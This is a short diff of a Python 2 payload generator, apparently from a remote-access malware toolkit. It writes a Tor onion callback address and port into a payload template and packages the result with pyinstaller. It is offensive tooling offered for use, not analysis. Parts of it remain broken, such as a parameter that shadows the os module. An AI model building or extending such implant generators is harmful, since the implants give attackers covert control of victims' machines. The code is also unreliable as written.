@@ -1,35 +1,39 @@
 import os
+import miniupnpc
 
 class Generator:
     def __init__(self,payload,port,addr,outfile="payload.py",opts={}):
+        print "[+] generating payload"
         self.payload = payload
         self.port = port
         self.addr = addr
         self.outfile = outfile
         self.opts = opts
 
-    def createPaylad(self):
+    def createPayload(self):
         counter = 0
         f = open(self.outfile,'w')
         for lines in open(self.payload,'r'):
-            if lines.statswith("#const"):
+            if lines.startswith("#constents"):
                 counter = 2
                 continue
-            if counter == 2:
-                f.write("OnionUrl = " + self.addr)
-                counter == 1
+            elif counter == 2:
+                f.write('OnionUrl = "' + self.addr + '"\n')
+                counter = 1
                 continue
-            if counter == 1:
-                f.write("PORT = " + self.port)
+            elif counter == 1:
+                f.write("PORT = " + str(self.port))
+                counter = 0
                 continue
             f.write(lines)
         f.close()
+        print "[+] payload generated"
 
     def Compile(self):
         c = compiler(self.outfile,'~/',self.payload.split("/")[0])
         
     def handler(self):
-        self.createPaylad()
+        self.createPayload()
         if self.opts["compile"] == True:
             self.Compile()
         
@@ -43,4 +47,4 @@ class compiler:
         if os == "linux":
             os.system("pyinstaller -F --specpath " + dir + " " + infile)
 
-    
+
